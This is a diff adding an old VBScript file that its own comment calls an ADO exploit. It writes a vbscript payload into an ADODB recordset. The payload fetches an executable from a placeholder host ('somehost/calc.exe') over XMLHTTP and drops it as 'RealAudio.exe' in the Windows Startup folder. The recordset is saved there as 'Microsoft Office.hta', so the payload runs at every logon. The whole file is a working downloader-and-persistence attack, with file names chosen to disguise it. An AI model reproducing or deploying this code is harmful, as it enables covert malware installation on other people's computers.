@@ -1,0 +1,19 @@
+on error resume next
+'whats different in this ADO exploit, is it creates a blank record set locally, and then uses XML to download a binary, instead of the painful anonymous ftp that was also needed to hold the rest of the instuctions
+set evanchik = CreateObject("ADODB.Recordset")
+With objRS
+.Fields.Append "evanchik", 200, "3000"
+Call .Open
+Call .AddNew
+.Fields("evanchik").Value = "meaning less text i had to put here"
+Call .AddNew
+.Fields("evanchik").Value = "<script language=vbscript>: on error resume 
+next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open 
+""GET"",""http://somehost/calc.exe"",False : o.send : set s = 
+createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : 
+s.savetofile ""C:\Documents and Settings\All Users\Start 
+Menu\Programs\Startup\RealAudio.exe"",2 : </script>"
+Call .Update
+End With
+evanchik.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
+evanchik.Close
